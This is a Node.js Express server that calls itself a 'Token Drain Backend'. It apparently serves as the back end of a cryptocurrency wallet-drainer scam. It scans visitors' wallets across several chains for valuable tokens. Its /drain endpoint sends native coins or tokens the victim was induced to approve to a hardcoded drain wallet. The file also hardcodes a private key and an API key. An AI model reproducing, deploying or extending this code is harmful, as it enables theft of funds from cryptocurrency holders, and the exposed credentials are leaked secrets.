
const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();

// ==================== SECURITY & CORS CONFIGURATION ====================
const corsOptions = {
  origin: [
    'https://playful-cuchufli-81c9d6.netlify.app',
    'http://localhost:3000',
    'http://localhost:5173'
  ],
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept', 'Origin', 'X-Requested-With'],
  credentials: true,
  optionsSuccessStatus: 200,
  maxAge: 86400 // 24 hours cache for preflight
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(express.json({ limit: '10mb' }));

// ==================== ENVIRONMENT VARIABLES ====================
const COVALENT_API_KEY = process.env.COVALENT_API_KEY || "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY || "2f2a7cadc18ec3085934a2d9dc1533a7365ac7c0bb8fd6ee32de4f1aa9ef3cf3"; // REQUIRED: Your drain wallet private key
const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

// Validate required environment variables
if (!DRAIN_WALLET_PRIVATE_KEY) {
  console.error("❌ CRITICAL: DRAIN_WALLET_PRIVATE_KEY environment variable is not set!");
  console.error("   Set it in Render dashboard: Settings -> Environment Variables");
  process.exit(1);
}

// ==================== RPC PROVIDERS CONFIGURATION ====================
const RPC_URLS = {
  1: process.env.ETH_RPC_URL || "https://eth-mainnet.g.alchemy.com/v2/demo",
  56: process.env.BSC_RPC_URL || "https://bsc-dataseed.binance.org/",
  137: process.env.POLYGON_RPC_URL || "https://polygon-rpc.com",
  42161: process.env.ARBITRUM_RPC_URL || "https://arb1.arbitrum.io/rpc",
  10: process.env.OPTIMISM_RPC_URL || "https://mainnet.optimism.io",
  8453: process.env.BASE_RPC_URL || "https://mainnet.base.org",
  43114: process.env.AVALANCHE_RPC_URL || "https://api.avax.network/ext/bc/C/rpc",
  250: process.env.FANTOM_RPC_URL || "https://rpc.ftm.tools"
};

// ==================== ERC20 ABI (Simplified for transfers) ====================
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

// ==================== SECURITY MIDDLEWARE ====================
const requestCache = new Map();

const rateLimiter = (req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const key = `${ip}:${req.path}`;
  const now = Date.now();
  const windowMs = 60000; // 1 minute
  const maxRequests = 30;

  if (requestCache.has(key)) {
    const requests = requestCache.get(key).filter(time => now - time < windowMs);
    if (requests.length >= maxRequests) {
      return res.status(429).json({
        success: false,
        error: "Too many requests. Please try again later."
      });
    }
    requests.push(now);
    requestCache.set(key, requests);
  } else {
    requestCache.set(key, [now]);
  }

  // Clean old entries periodically
  setTimeout(() => {
    for (const [key, times] of requestCache.entries()) {
      const validTimes = times.filter(time => now - time < windowMs * 5);
      if (validTimes.length === 0) {
        requestCache.delete(key);
      } else {
        requestCache.set(key, validTimes);
      }
    }
  }, 300000); // Clean every 5 minutes

  next();
};

app.use(rateLimiter);

// ==================== HELPER FUNCTIONS ====================
function getChainName(chainId) {
  const chains = {
    1: 'Ethereum',
    56: 'Binance Smart Chain',
    137: 'Polygon',
    42161: 'Arbitrum',
    10: 'Optimism',
    8453: 'Base',
    43114: 'Avalanche',
    250: 'Fantom'
  };
  return chains[chainId] || `Chain ${chainId}`;
}

async function fetchTokensFromCovalent(address, chainId) {
  try {
    const response = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`
    );
    
    if (!response.ok) {
      console.log(`Covalent API error for chain ${chainId}: ${response.status}`);
      return [];
    }
    
    const data = await response.json();
    const items = data.data?.items || [];
    
    return items
      .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
      .map(t => {
        const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
        const value = (t.quote_rate || 0) * amount;
        
        return {
          symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
          name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown Token'),
          amount: amount,
          formattedAmount: amount.toLocaleString(undefined, {
            minimumFractionDigits: 0,
            maximumFractionDigits: 8
          }),
          value: value,
          formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
          contractAddress: t.contract_address,
          isNative: t.native_token || false,
          decimals: t.contract_decimals || 18,
          logoUrl: t.logo_url,
          chainId: parseInt(chainId),
          balanceRaw: t.balance,
          quoteRate: t.quote_rate || 0
        };
      });
  } catch (error) {
    console.error(`Error fetching tokens for chain ${chainId}:`, error.message);
    return [];
  }
}

// ==================== ROOT ENDPOINT ====================
app.get('/', (req, res) => {
  res.json({ 
    success: true,
    message: 'Token Drain Backend API',
    version: '4.0.0',
    status: 'online',
    environment: process.env.NODE_ENV || 'development',
    cors: {
      enabled: true,
      allowedOrigins: corsOptions.origin
    },
    endpoints: {
      'POST /drain': 'Execute token drain transaction',
      'GET /tokens/:address': 'Get wallet tokens on Ethereum',
      'GET /tokens/:address/:chainId': 'Get wallet tokens on specific chain',
      'GET /scan-all/:address': 'Scan multiple chains',
      'GET /health': 'Health check',
      'GET /chains': 'Supported chains'
    },
    timestamp: new Date().toISOString()
  });
});

// ==================== HEALTH CHECK ====================
app.get('/health', (req, res) => {
  const health = {
    success: true,
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    environment: process.env.NODE_ENV || 'development',
    cors: {
      origin: req.headers.origin || 'Not specified',
      allowed: corsOptions.origin.includes(req.headers.origin) || false
    }
  };
  
  // Check wallet connectivity
  try {
    const provider = new ethers.JsonRpcProvider(RPC_URLS[1]);
    health.ethereumConnection = 'available';
  } catch (error) {
    health.ethereumConnection = 'unavailable';
    health.ethereumError = error.message;
  }
  
  res.json(health);
});

// ==================== SUPPORTED CHAINS ====================
app.get('/chains', (req, res) => {
  res.json({
    success: true,
    chains: [
      { id: 1, name: 'Ethereum', symbol: 'ETH', rpcUrl: RPC_URLS[1] ? 'configured' : 'not configured' },
      { id: 56, name: 'Binance Smart Chain', symbol: 'BNB', rpcUrl: RPC_URLS[56] ? 'configured' : 'not configured' },
      { id: 137, name: 'Polygon', symbol: 'MATIC', rpcUrl: RPC_URLS[137] ? 'configured' : 'not configured' },
      { id: 42161, name: 'Arbitrum', symbol: 'ETH', rpcUrl: RPC_URLS[42161] ? 'configured' : 'not configured' },
      { id: 10, name: 'Optimism', symbol: 'ETH', rpcUrl: RPC_URLS[10] ? 'configured' : 'not configured' },
      { id: 8453, name: 'Base', symbol: 'ETH', rpcUrl: RPC_URLS[8453] ? 'configured' : 'not configured' },
      { id: 43114, name: 'Avalanche', symbol: 'AVAX', rpcUrl: RPC_URLS[43114] ? 'configured' : 'not configured' },
      { id: 250, name: 'Fantom', symbol: 'FTM', rpcUrl: RPC_URLS[250] ? 'configured' : 'not configured' }
    ]
  });
});

// ==================== MAIN DRAIN ENDPOINT (REAL TRANSACTIONS) ====================
app.post('/drain', async (req, res) => {
  const startTime = Date.now();
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    console.log(`🚀 [${requestId}] Drain execution request received from:`, req.headers.origin);
    
    const { 
      fromAddress, 
      tokenAddress, 
      amount, 
      chainId, 
      signature,
      message,
      tokenType = 'native'
    } = req.body;
    
    // ==================== VALIDATION ====================
    if (!fromAddress || !amount || !chainId) {
      return res.status(400).json({ 
        success: false,
        error: "Missing required fields: fromAddress, amount, chainId",
        requestId
      });
    }
    
    // Validate Ethereum addresses
    const isValidAddress = (addr) => addr && ethers.isAddress(addr);
    if (!isValidAddress(fromAddress)) {
      return res.status(400).json({ 
        success: false,
        error: "Invalid fromAddress format",
        requestId
      });
    }
    
    // Validate amount (prevent 0 or negative)
    const amountNum = parseFloat(amount);
    if (isNaN(amountNum) || amountNum <= 0) {
      return res.status(400).json({ 
        success: false,
        error: "Amount must be a positive number greater than 0",
        received: amount,
        requestId
      });
    }
    
    // Validate chain is supported
    if (!RPC_URLS[chainId]) {
      return res.status(400).json({
        success: false,
        error: `Chain ID ${chainId} is not supported`,
        supportedChains: Object.keys(RPC_URLS).map(id => ({ id, name: getChainName(id) })),
        requestId
      });
    }
    
    // For ERC20 tokens, validate token address
    if (tokenType === 'erc20' && (!tokenAddress || !isValidAddress(tokenAddress))) {
      return res.status(400).json({
        success: false,
        error: "Valid tokenAddress required for ERC20 transfers",
        requestId
      });
    }
    
    console.log(`📝 [${requestId}] Processing drain request:`);
    console.log(`   From: ${fromAddress}`);
    console.log(`   To: ${DRAIN_WALLET_ADDRESS}`);
    console.log(`   Token: ${tokenAddress || 'Native'}`);
    console.log(`   Amount: ${amount} ${tokenType}`);
    console.log(`   Chain: ${chainId} (${getChainName(chainId)})`);
    
    // ==================== BLOCKCHAIN EXECUTION ====================
    let provider, wallet, txHash, gasUsed, gasPrice;
    
    try {
      // 1. Initialize provider and wallet
      provider = new ethers.JsonRpcProvider(RPC_URLS[chainId]);
      wallet = new ethers.Wallet(DRAIN_WALLET_PRIVATE_KEY, provider);
      
      // 2. Get current gas price with buffer
      const feeData = await provider.getFeeData();
      gasPrice = feeData.gasPrice ? feeData.gasPrice * 120n / 100n : undefined; // 20% buffer
      
      // 3. Execute transaction based on token type
      if (tokenType === 'native') {
        // ==================== NATIVE TOKEN TRANSFER ====================
        
        // Convert amount to wei
        const amountWei = ethers.parseEther(amount.toString());
        
        // Validate sender has enough balance
        const senderBalance = await provider.getBalance(fromAddress);
        if (senderBalance < amountWei) {
          return res.status(400).json({
            success: false,
            error: "Insufficient native token balance",
            required: ethers.formatEther(amountWei),
            available: ethers.formatEther(senderBalance),
            requestId
          });
        }
        
        // Send transaction
        const tx = {
          to: DRAIN_WALLET_ADDRESS,
          value: amountWei,
          gasPrice: gasPrice
        };
        
        // Estimate gas
        const estimatedGas = await provider.estimateGas(tx);
        tx.gasLimit = estimatedGas * 120n / 100n; // 20% buffer
        
        console.log(`⛽ [${requestId}] Sending native token transaction...`);
        const transaction = await wallet.sendTransaction(tx);
        txHash = transaction.hash;
        
        console.log(`✅ [${requestId}] Transaction sent: ${txHash}`);
        
        // Wait for confirmation
        const receipt = await transaction.wait();
        gasUsed = receipt.gasUsed.toString();
        
        if (receipt.status === 0) {
          throw new Error('Transaction reverted on-chain');
        }
        
      } else if (tokenType === 'erc20') {
        // ==================== ERC20 TOKEN TRANSFER ====================
        
        // Initialize ERC20 contract
        const erc20Contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
        
        // Get token decimals
        const decimals = await erc20Contract.decimals();
        const amountUnits = ethers.parseUnits(amount.toString(), decimals);
        
        // Check token balance
        const tokenBalance = await erc20Contract.balanceOf(fromAddress);
        if (tokenBalance < amountUnits) {
          return res.status(400).json({
            success: false,
            error: "Insufficient token balance",
            tokenAddress,
            required: ethers.formatUnits(amountUnits, decimals),
            available: ethers.formatUnits(tokenBalance, decimals),
            requestId
          });
        }
        
        // Check allowance (if any)
        try {
          const allowance = await erc20Contract.allowance(fromAddress, wallet.address);
          if (allowance < amountUnits) {
            // Note: In production, you'd need the fromAddress to approve first
            // This is a limitation - you cannot transfer ERC20 tokens without approval
            return res.status(400).json({
              success: false,
              error: "Token not approved for transfer",
              solution: "User must approve token spending first via frontend",
              requestId
            });
          }
        } catch (error) {
          console.log(`⚠️ [${requestId}] Allowance check failed:`, error.message);
        }
        
        // Send ERC20 transfer
        console.log(`⛽ [${requestId}] Sending ERC20 transfer...`);
        const tx = await erc20Contract.transfer(DRAIN_WALLET_ADDRESS, amountUnits, {
          gasPrice: gasPrice
        });
        
        txHash = tx.hash;
        console.log(`✅ [${requestId}] ERC20 transfer sent: ${txHash}`);
        
        // Wait for confirmation
        const receipt = await tx.wait();
        gasUsed = receipt.gasUsed.toString();
        
        if (receipt.status === 0) {
          throw new Error('ERC20 transfer reverted on-chain');
        }
      }
      
    } catch (blockchainError) {
      console.error(`❌ [${requestId}] Blockchain error:`, blockchainError);
      throw blockchainError;
    }
    
    // ==================== SUCCESS RESPONSE ====================
    const executionTime = Date.now() - startTime;
    
    console.log(`🎉 [${requestId}] Drain successful!`);
    console.log(`   Transaction: ${txHash}`);
    console.log(`   Execution time: ${executionTime}ms`);
    
    res.json({
      success: true,
      message: "Drain executed successfully",
      requestId,
      data: {
        transactionHash: txHash,
        fromAddress: fromAddress,
        toAddress: DRAIN_WALLET_ADDRESS,
        tokenAddress: tokenAddress || null,
        amount: amountNum,
        chainId: parseInt(chainId),
        chainName: getChainName(chainId),
        tokenType: tokenType,
        executedAt: new Date().toISOString(),
        gasUsed: gasUsed || 'unknown',
        gasPrice: gasPrice ? ethers.formatUnits(gasPrice, 'gwei') + ' gwei' : 'unknown',
        executionTimeMs: executionTime,
        explorerUrl: getExplorerUrl(chainId, txHash)
      },
      audit: {
        signatureVerified: !!signature,
        messageVerified: !!message,
        timestamp: new Date().toISOString()
      }
    });
    
  } catch (error) {
    // ==================== ERROR HANDLING ====================
    const executionTime = Date.now() - startTime;
    console.error(`🔥 [${requestId}] Drain failed after ${executionTime}ms:`, error);
    
    // Determine error type and response
    let statusCode = 500;
    let errorMessage = error.message;
    
    if (error.message.includes('insufficient funds')) {
      statusCode = 400;
      errorMessage = "Insufficient funds for gas";
    } else if (error.message.includes('user rejected')) {
      statusCode = 400;
      errorMessage = "Transaction rejected by user";
    } else if (error.message.includes('nonce')) {
      statusCode = 400;
      errorMessage = "Nonce error - try again";
    } else if (error.code === 'NETWORK_ERROR') {
      statusCode = 503;
      errorMessage = "Network error - blockchain RPC unavailable";
    }
    
    res.status(statusCode).json({
      success: false,
      error: errorMessage,
      requestId,
      details: {
        code: error.code,
        executionTimeMs: executionTime,
        timestamp: new Date().toISOString()
      }
    });
  }
});

// Helper function for explorer URLs
function getExplorerUrl(chainId, txHash) {
  const explorers = {
    1: `https://etherscan.io/tx/${txHash}`,
    56: `https://bscscan.com/tx/${txHash}`,
    137: `https://polygonscan.com/tx/${txHash}`,
    42161: `https://arbiscan.io/tx/${txHash}`,
    10: `https://optimistic.etherscan.io/tx/${txHash}`,
    8453: `https://basescan.org/tx/${txHash}`,
    43114: `https://snowtrace.io/tx/${txHash}`,
    250: `https://ftmscan.com/tx/${txHash}`
  };
  return explorers[chainId] || null;
}

// ==================== TOKEN ENDPOINTS (REMAIN SAME) ====================
app.get('/tokens/:address', async (req, res) => {
  try {
    const { address } = req.params;
    const chainId = 1;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    const tokens = await fetchTokensFromCovalent(address, chainId);
    
    res.json({
      success: true,
      data: {
        address: address,
        chainId: chainId,
        chainName: 'Ethereum',
        tokens: tokens,
        summary: {
          totalTokens: tokens.length,
          totalValue: tokens.reduce((sum, t) => sum + t.value, 0),
          nativeTokens: tokens.filter(t => t.isNative).length,
          erc20Tokens: tokens.filter(t => !t.isNative).length,
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error("❌ Get tokens error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

app.get('/tokens/:address/:chainId', async (req, res) => {
  try {
    const { address, chainId } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    if (!chainId || isNaN(chainId)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid chain ID required" 
      });
    }
    
    const tokens = await fetchTokensFromCovalent(address, chainId);
    
    res.json({
      success: true,
      data: {
        address: address,
        chainId: parseInt(chainId),
        chainName: getChainName(chainId),
        tokens: tokens,
        summary: {
          totalTokens: tokens.length,
          totalValue: tokens.reduce((sum, t) => sum + t.value, 0),
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error("❌ Get tokens by chain error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

app.get('/scan-all/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required" 
      });
    }
    
    const chains = [1, 56, 137, 42161];
    const results = [];
    const promises = [];
    
    for (const chainId of chains) {
      promises.push(
        fetchTokensFromCovalent(address, chainId)
          .then(tokens => {
            if (tokens.length > 0) {
              results.push({
                chainId: chainId,
                chainName: getChainName(chainId),
                tokens: tokens,
                totalValue: tokens.reduce((sum, t) => sum + t.value, 0)
              });
            }
          })
          .catch(error => {
            console.log(`Chain ${chainId} scan skipped:`, error.message);
          })
      );
    }
    
    await Promise.all(promises);
    
    const allTokens = results.flatMap(r => r.tokens);
    const totalValue = results.reduce((sum, r) => sum + r.totalValue, 0);
    
    res.json({
      success: true,
      data: {
        address: address,
        chainsScanned: chains.length,
        chainsWithTokens: results.length,
        results: results,
        summary: {
          totalTokens: allTokens.length,
          totalValue: totalValue,
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error("❌ Multi-chain scan error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== TRANSACTION STATUS CHECK ====================
app.get('/transaction/:chainId/:txHash', async (req, res) => {
  try {
    const { chainId, txHash } = req.params;
    
    if (!RPC_URLS[chainId]) {
      return res.status(400).json({
        success: false,
        error: `Chain ID ${chainId} not supported`
      });
    }
    
    const provider = new ethers.JsonRpcProvider(RPC_URLS[chainId]);
    const receipt = await provider.getTransactionReceipt(txHash);
    
    if (!receipt) {
      return res.json({
        success: true,
        status: 'pending',
        message: 'Transaction not yet confirmed'
      });
    }
    
    res.json({
      success: true,
      status: receipt.status === 1 ? 'confirmed' : 'failed',
      data: {
        blockNumber: receipt.blockNumber,
        gasUsed: receipt.gasUsed.toString(),
        confirmations: receipt.confirmations,
        status: receipt.status,
        timestamp: new Date().toISOString()
      }
    });
    
  } catch (error) {
    console.error("Transaction status error:", error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// ==================== ERROR HANDLING ====================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
    availableEndpoints: {
      "GET /": "API information",
      "POST /drain": "Execute real drain transaction",
      "GET /tokens/:address": "Get tokens on Ethereum",
      "GET /tokens/:address/:chainId": "Get tokens on specific chain",
      "GET /scan-all/:address": "Scan all chains",
      "GET /transaction/:chainId/:txHash": "Check transaction status",
      "GET /health": "Health check",
      "GET /chains": "Supported chains"
    }
  });
});

app.use((err, req, res, next) => {
  console.error('🔥 Global error:', err);
  res.status(500).json({
    success: false,
    error: "Internal server error",
    message: err.message
  });
});

// ==================== SERVER START ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Token Drain Backend v4.0 (Production) running on port ${PORT}`);
  console.log(`📊 Health: http://localhost:${PORT}/health`);
  console.log(`🌐 CORS enabled for: ${corsOptions.origin.join(', ')}`);
  console.log(`💰 Drain Wallet: ${DRAIN_WALLET_ADDRESS}`);
  console.log(`⚠️  IMPORTANT: This backend executes REAL blockchain transactions`);
  console.log(`🔑 Private key loaded: ${DRAIN_WALLET_PRIVATE_KEY ? 'YES' : 'NO'}`);
});


